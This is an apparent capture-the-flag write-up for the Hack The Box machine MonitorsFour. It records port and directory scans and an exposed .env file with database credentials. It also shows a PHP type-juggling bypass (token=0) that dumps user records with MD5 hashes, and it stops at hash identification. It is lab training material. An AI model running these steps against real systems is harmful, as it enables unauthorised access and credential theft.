We start with a enum4linux anonymous scan:

```shell
 ==========================
|    Target Information    |
 ==========================
[*] Target ........... monitorsfour.htb
[*] Username ......... 'guest'
[*] Random Username .. 'zeupidur'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =========================================
|    Listener Scan on monitorsfour.htb    |
 =========================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: timed out
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: timed out
[*] Checking SMB
[-] Could not connect to SMB on 445/tcp: timed out
[*] Checking SMB over NetBIOS
[-] Could not connect to SMB over NetBIOS on 139/tcp: timed out

 ===============================================================
|    NetBIOS Names and Workgroup/Domain for monitorsfour.htb    |
 ===============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

[!] Aborting remainder of tests since neither SMB nor LDAP are accessible
```

We try to collect information with bloodhound but we get:

```shell
dns.resolver.LifetimeTimeout: The resolution lifetime expired after 3.104 seconds: Server 10.129.33.189 UDP port 53 answered The DNS operation timed out.
```

We do a tcp nmap scan:

```shell
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
| http-methods:
|_  Supported Methods: GET
|_http-title: MonitorsFour - Networking Solutions
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: 889DCABDC39A9126364F6A675AA4167D
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

Running (JUST GUESSING): Microsoft Windows 2022 (88%)
```

We find a web application running on port 80 and winrm on port 5985.

A UDP scan is done but doesn't yield any results.

We check for subdomains with ffuf:

```shell
[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 78ms]
| URL | http://monitorsfour.htb:80
| --> | /cacti
    * FUZZ: cacti
```

After adding the subdomain to our hosts file and going to cacti.monitorsfour.htb, we are welcomed with [cacti](https://www.cacti.net/) login page.

On the login page, we find out the version of cacti is 1.2.28.

We find the following CVE for cacti 1.2.28:

- CVE-2024-45598
- CVE-2024-54145
- CVE-2024-54146
- CVE-2025-22604
- CVE-2025-24367
- CVE-2025-24368
- CVE-2025-26520
- CVE-2025-66399

And the following 7 recent Security Advisories:

- [SNMP Command Injection leads to RCE in Cacti v1.2.28](https://github.com/Cacti/cacti/security/advisories/GHSA-c7rr-2h93-7gjf)
- [Arbitrary File Creation leading to RCE](https://github.com/Cacti/cacti/security/advisories/GHSA-fxrq-fr7h-9rqq)
- [Authenticated RCE via multi-line SNMP responses](https://github.com/Cacti/cacti/security/advisories/GHSA-c5j8-jxj3-hh36)
- [SQL Injection vulnerability when view host template](https://github.com/Cacti/cacti/security/advisories/GHSA-vj9g-p7f2-4wqj)
- [SQL Injection vulnerability when request automation devices](https://github.com/Cacti/cacti/security/advisories/GHSA-fh3x-69rr-qqpp)
- [SQL Injection vulnerability when using tree rules through Automation API](https://github.com/Cacti/cacti/security/advisories/GHSA-f9c7-7rc3-574c)
- [Local File Inclusion (LFI) Vulnerability via Poller Standard Error Log Path](https://github.com/Cacti/cacti/security/advisories/GHSA-pv2c-97pp-vxwg)

But all of them require to be authenticated.

Since our recon is over and we are blocked with cacti, let's continue exploring the web app.

Since this is a webapp, we scan the directories with gobuster:

```shell
/.htaccess            (Status: 403) [Size: 146]
/config/.htaccess     (Status: 403) [Size: 146]
/logs/.htaccess       (Status: 403) [Size: 146]
/plugins/enigma/home/.htaccess (Status: 403) [Size: 146]
/temp/.htaccess       (Status: 403) [Size: 146]
/static               (Status: 301) [Size: 162] [--> http://monitorsfour.htb/static/]
/controllers          (Status: 301) [Size: 162] [--> http://monitorsfour.htb/controllers/]
/views                (Status: 301) [Size: 162] [--> http://monitorsfour.htb/views/]
/contact              (Status: 200) [Size: 367]
/login                (Status: 200) [Size: 4340]
/.env                 (Status: 200) [Size: 97]
/user                 (Status: 200) [Size: 35]
/forgot-password      (Status: 200) [Size: 3099]
/admin/.htaccess      (Status: 403) [Size: 146]
/administrator/.htaccess (Status: 403) [Size: 146]
/app/.htaccess        (Status: 403) [Size: 146]
```

The .env is promising. Searching for /plugins/enigma/home/ online suggest this might be a plugin for either roundcube or wordpress:

- Roundcube Enigma Plugin (most common) - The PGP encryption plugin for Roundcube webmail that we discussed earlier. This is by far the most prevalent web-based plugin called "Enigma."

- WordPress Enigma Plugin - A closed/retired WordPress plugin for hiding content, but this would typically be found at /wp-content/plugins/enigma/ rather than just /enigma/

- WordPress Enigma Theme - A WordPress theme (not plugin), also unlikely to appear at /enigma/

Maybe we can exploit it, but first let's finish our recon.

We can try crawling the app with Katana to make sure we didn't miss anything:

```
http://monitorsfour.htb:80/
http://monitorsfour.htb:80/
http://monitorsfour.htb:80/static/css/style.css
http://monitorsfour.htb:80/static/css/plugins.css
http://monitorsfour.htb:80/static/js/plugins.js
http://monitorsfour.htb:80/login
http://monitorsfour.htb:80/static/js/smoothscroll.js
http://monitorsfour.htb:80/static/js/custom.js
http://monitorsfour.htb:80/static/js/popper.min.js
http://monitorsfour.htb:80/static/js/bootstrap.min.js
http://monitorsfour.htb:80/static/js/jquery-min.js
http://monitorsfour.htb:80/static/js/owl.carousel.min.js
http://monitorsfour.htb:80/static/admin/assets/js/plugins/loaders/blockui.min.js
http://monitorsfour.htb:80/static/admin/assets/css/minified/core.min.css
http://monitorsfour.htb:80/static/admin/assets/js/core/libraries/bootstrap.min.js
http://monitorsfour.htb:80/static/admin/assets/js/core/app.js
http://monitorsfour.htb:80/static/admin/assets/js/core/libraries/jquery.min.js
http://monitorsfour.htb:80/static/admin/assets/css/minified/bootstrap.min.css
http://monitorsfour.htb:80/static/admin/assets/css/minified/components.min.css
http://monitorsfour.htb:80/static/admin/assets/css/icons/icomoon/styles.css
http://monitorsfour.htb:80/static/admin/assets/js/plugins/loaders/'+i.iframeSrc+'
http://monitorsfour.htb:80/forgot-password
http://monitorsfour.htb:80/static/admin/assets/js/plugins/loaders/pace.min.js
http://monitorsfour.htb:80/static/admin/assets/css/minified/colors.min.css
http://monitorsfour.htb:80/static/admin/assets/js/core/libraries/tooltip.js
http://monitorsfour.htb:80/static/admin/assets/js/core/libraries/.test
http://monitorsfour.htb:80/static/js/Popper.js
http://monitorsfour.htb:80/static/js/popper.js
http://monitorsfour.htb:80/static/admin/assets/css/minified/github.com/necolas/normalize.css
```

Looking at the page source for the login page, we also find in the form:

```
http://monitorsfour.htb/api/v1/auth
```

On the password recovery page we also find:

```
http://monitorsfour.htb/api/v1/reset
```

So we know this is a PHP app running on what seems to be a Linux machine. We can also confirm it's a PHP app because of the PHPSESSID cookie. Maybe a container since it seems to be a Linux machine?

If we check the .env:

```conf
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```

We now have the db user and password, but they don't work to log into the web app.

We try the credentials we found in the .env but they don't work for cacti either.

Let's continue with the other interesting routes.

If we try the /contact route:

```php
Warning: include(/var/www/app/views/contact.php): Failed to open stream: No such file or directory in /var/www/app/Router.php on line 110

Warning: include(): Failed opening '/var/www/app/views/contact.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/app/Router.php on line 110
```

If we try the /user route:

```json
{ "error": "Missing token parameter" }
```

Expected since we are not logged in.

If we try a random token:

```
http://monitorsfour.htb/user?token=test
```

```json
{ "error": "Invalid or missing token" }
```

Since the website is PHP, we could try PHP Type Juggling (Loose Comparison):

```
http://monitorsfour.htb/user?token=0
```

It works ! We now have a list of all users:

```json
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user",
    "token": "8024b78f83f102da4f",
    "name": "Marcus Higgins",
    "position": "System Administrator",
    "dob": "1978-04-26",
    "start_date": "2021-01-12",
    "salary": "320800.00"
  },
  {
    "id": 5,
    "username": "mwatson",
    "email": "mwatson@monitorsfour.htb",
    "password": "69196959c16b26ef00b77d82cf6eb169",
    "role": "user",
    "token": "0e543210987654321",
    "name": "Michael Watson",
    "position": "Website Administrator",
    "dob": "1985-02-15",
    "start_date": "2021-05-11",
    "salary": "75000.00"
  },
  {
    "id": 6,
    "username": "janderson",
    "email": "janderson@monitorsfour.htb",
    "password": "2a22dcf99190c322d974c8df5ba3256b",
    "role": "user",
    "token": "0e999999999999999",
    "name": "Jennifer Anderson",
    "position": "Network Engineer",
    "dob": "1990-07-16",
    "start_date": "2021-06-20",
    "salary": "68000.00"
  },
  {
    "id": 7,
    "username": "dthompson",
    "email": "dthompson@monitorsfour.htb",
    "password": "8d4a7e7fd08555133e056d9aacb1e519",
    "role": "user",
    "token": "0e111111111111111",
    "name": "David Thompson",
    "position": "Database Manager",
    "dob": "1982-11-23",
    "start_date": "2022-09-15",
    "salary": "83000.00"
  }
]
```

Using namethathash, we find that the hash type is md5

```shell
Most Likely
MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files.
MD4, HC: 900 JtR: raw-md4
NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.
Domain Cached Credentials, HC: 1100 JtR: mscach
```
